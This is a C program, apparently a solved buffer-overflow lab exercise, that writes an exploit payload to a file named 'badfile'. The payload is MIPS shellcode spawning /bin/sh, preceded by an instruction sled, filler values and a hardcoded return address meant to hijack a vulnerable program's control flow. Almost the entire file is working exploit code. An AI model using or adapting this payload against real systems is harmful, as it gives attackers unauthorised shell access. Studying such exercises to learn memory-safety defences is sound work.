#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] = {
    "\x24\x06\x06\x66" /* li a2,1638 */
    "\x04\xd0\xff\xff" /* bltzal a2,4100b4 <p> */
    "\x28\x06\xff\xff" /* slti a2,zero,-1 */
    "\x27\xbd\xff\xe0" /* addiu sp,sp,-32 */
    "\x27\xe4\x10\x01" /* addiu a0,ra,4097 */
    "\x24\x84\xf0\x1f" /* addiu a0,a0,-4065 */
    "\xaf\xa4\xff\xe8" /* sw a0,-24(sp) */
    "\xaf\xa0\xff\xec" /* sw zero,-20(sp) */
    "\x27\xa5\xff\xe8" /* addiu a1,sp,-24 */
    "\x24\x02\x0f\xab" /* li v0,4011 */
    "\x01\x01\x01\x0c" /* syscall 0x40404 */
    "/bin/sh" /* sltiu v0,k1,26990 */
    /* sltiu s3,k1,26624 */
};
void main(int argc, char **argv)
{
    char buffer[600];
    FILE *badfile;
    /* The approximate address of the shell code. */
    char return_address[] = "\x7f\xff\x75\xbc";
    memset(&buffer, 0x00, 600);
    /* Fill in the buffer with "addiu $t1,$t1,257" */
    int i = 0;
    for(i=0;i<596;i+=4){
        buffer[i] = 0x25;
        buffer[i+1] = 0x29;
        buffer[i+2] = 0x01;
        buffer[i+3] = 0x01;
    }
    /* You need to fill the buffer with appropriate data here. */
    
    char *p = buffer;
    memcpy(p, "12345678", 8);
    p += 8;
    memcpy(p, "secretxx", 8);
    p += 8;
    memcpy(p, "\x7f\xff\x75\xb8", 4);
    p += 4;
    memcpy(p, return_address, 4);
    p += 4;
    memcpy(p, "\x7f\xff\x75\xd8", 4);
    p += 4;
    memcpy(p, shellcode, sizeof(shellcode));

    /* Save the content to the file "badfile". */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 600, 1, badfile);
    fclose(badfile);
}
